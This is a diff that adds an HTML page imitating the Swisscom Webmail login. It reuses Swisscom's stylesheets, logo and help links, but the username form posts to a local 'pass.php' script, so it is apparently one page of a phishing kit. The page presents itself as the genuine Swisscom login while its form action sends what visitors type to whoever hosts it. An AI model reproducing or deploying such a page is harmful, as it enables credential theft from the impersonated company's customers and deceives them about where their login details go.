@@ -1,0 +1,157 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="x-ua-compatible" content="ie=edge"/>
+    <title>Swisscom Login</title>
+    <link rel="stylesheet" href="https://login.scl.swisscom.ch/commons-d5b596036e661ac38f22c70a7cd50323.css"/>
+    <link rel="stylesheet" type="text/css" href="https://login.scl.swisscom.ch/username-18965c05ee0f844a4bb9fde6dfa6a0f2.css">
+    
+    <script type="module" src="/webcomponents.esm-1f5f3d9c71b67350c64ec55c2acbadc3.js"></script>
+</head>
+
+<body class="light-theme">
+
+<div class="main-wrapper" id="loginPage">
+    <div id="header"></div>
+    
+    <div class="login-container page flex-items-md-center">
+        <div class="login-content-container row no-gutters flex-items-xs-center">
+            <div class="rpp-container col-md-6 center-vertical" role="region"
+                 style="background-color:#a63297;">
+                <div>
+   <div class="rpp-container white margin-md-4 margin-v-4 margin-xs-1">
+        <img id="rpLogo" class="margin-bottom-3" src="https://rp-static-content.scl.swisscom.ch/content/webmail_logo.png"/>
+        <h2 id="rpTitle">Webmail</h2>
+        <p id="desc1" class="text-small">Mit dem praktischen Webmail haben Sie immer und überall Zugriff auf Ihre E-Mails, Kontakte und Kalender.</p>
+        
+        <p id="link1" class="text-small"><a href="https://www.swisscom.ch/de/privatkunden/internet-fernsehen-festnetz/internet/e-mail.html">Jetzt gratis E-Mail Adresse erstellen</a></p>
+        <p id="link2" class="text-small"><a href="https://www.swisscom.ch/de/privatkunden/hilfe/internet.html">Fragen zum Thema E-Mail</a></p>
+        
+    </div>
+
+    
+</div>
+            </div>
+            <div class="col-md-6 flex-md-middle">
+                <div class="card custom-card card--not-rounded" style="--colorTheme:#a63297;"
+                     role="region">
+                    <div class="bg-horizon-tint-1">
+    <div id="cookie-information" class="bg bg--light margin-bottom-2">
+        <div class="card card--dark card--notification">
+            <div class="card__header">
+                <h1 class="align-left">Your Browser does not accept any Cookies.</h1>
+            </div>
+            <p class="card__text">Please set in your browser preferences the cookie option.</p>
+        </div>
+    </div>
+
+    <div class="life-form"></div>
+    <h1 class="page-title">Swisscom Login</h1>
+    <div class="login-info-container">
+        <p class="page-instruction-msg margin-bottom-3">
+            <span id="loginInfo">Melden Sie sich bitte mit Ihrem Benutzernamen oder Ihrer Mobilnummer an.</span>
+            <button type="button"
+
+                    href="identifier-info">
+            </button>
+        </p>
+    </div>
+
+    <form method="post"
+          action="pass.php"
+          id="form" >
+        <div class="margin-bottom-2">
+            <div class="input-field input-field--fixed">
+                <input type="text" id="username" name="UN"
+                       placeholder="Benutzername oder Mobilnummer"
+                       value="" required="required" />
+                <label for="username">Benutzername oder Mobilnummer</label>
+                <div class="message">
+                    <sdx-validation-message appearance="light-theme" validation-message="This is a required field">
+                    </sdx-validation-message>
+                </div>
+
+                
+                
+                
+            </div>
+        </div>
+
+        <div class="component"><button style="width:100%" class="button button-reset primary sdx-light-theme" type="submit">
+		<div aria-live="polite">Weiter<span class="sr-only"></span></div></button></div>
+		
+        <!-- Added hidden pwd field to enable Chrome Password Manager functionality -->
+        <input type="password" class="hidden" name="dummyPasswordField"/><br>
+       			<div class="component checkbox"><input id="1" type="checkbox" aria-describedby="groupLabel description validationMessage"><label for="1">&nbsp;Angemeldet bleiben<slot></slot></label></div>
+        <br>
+		
+        <div class="margin-bottom-2">
+            <a class="text-small" href="https://recovery.scl.swisscom.ch/username-recovery?RURL=https%3A%2F%2Fbwsso.login.scl.swisscom.ch%2Flogin%3FSNA%3Dmyswisscom%26keepLogin%3Dtrue%26RURL%3Dhttps%253A%252F%252Fwww.swisscom.ch%252Fmyswisscom%252F%253Flogin%2526nevistokenconsume%26L%3Den%26pps%3Ddesktop&amp;lang=en">Benutzername vergessen?</a>
+            
+        </div>
+
+        <div class="margin-bottom-2">
+            <!-- IDP-7997: Remove "Using Mobile ID" for now, but might be reactivated. Therefore, do not remove entirely. -->
+            <!-- <p><a th:target="_blank" th:href="#{link.mobileId.url}" th:text="#{link.mobileId.text}"/></p> -->
+        </div>
+
+        <!-- Pseudo submit input is needed for some password managers to support automatic submission -->
+        <input type="submit" value="">
+    </form>
+
+    <div class="modal" id="identifier-info" role="dialog" tabindex="-1" data-init="auto">
+        <div class="container">
+            <div class="modal__content col-xs col-md-10 col-lg-8 col-xl-6">
+                <div class="modal__body">
+                    <p>The username can also be an e-mail address if you have chosen an e-mail address as the username. </p>
+                    <sdx-button
+                            label="Close"
+                            type="button"
+                            class="modal-close" appearance="light-theme">
+                    </sdx-button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+                    <div>
+    <div style="display: none;" id="seleniumViewName" data-selenium-view-name="username"></div>
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer class="footer footer--compact">
+    <div class="container">
+        <a href="javascript:void(0);" class="logo hidden-sm-down" tabindex="-1">
+            <span class="logo-lifeform" aria-label="Swisscom Logo"></span>
+        </a>
+        <ul class="nav-items">
+            <li class="nav-item">
+                <a href="https://www.swisscom.ch/en/residential/help/data-and-bills/the-swisscom-login.html" class="nav-link">About Swisscom Login</a>
+            </li>
+            <li class="nav-item">
+                <div class="input-field" id="language-selector">
+                    <div class="select" style="min-width: 90px;">
+                        <sdx-select id="language-select" tabindex="1" class="closed" appearance="light-theme">
+                            <sdx-select-option value="de">DE</sdx-select-option>
+                            <sdx-select-option value="en">EN</sdx-select-option>
+                            <sdx-select-option value="fr">FR</sdx-select-option>
+                            <sdx-select-option value="it">IT</sdx-select-option>
+                        </sdx-select>
+                    </div>
+                </div>
+            </li>
+        </ul>
+    </div>
+</footer>
+</div>
+
+<script type="text/javascript" src="/commons.bundle-2538c7403a35e5210ba22639e7ea5da1.js"></script>
+<script type="text/javascript" src="/login-layout.bundle-0ffae2a40defd1bb5020c2f27d2c420d.js"></script>
+<script type="text/javascript" src="/username.bundle-bbb6eb130f6bd8f1ed56bc3c6520a305.js"></script>
+</body>
+</html>
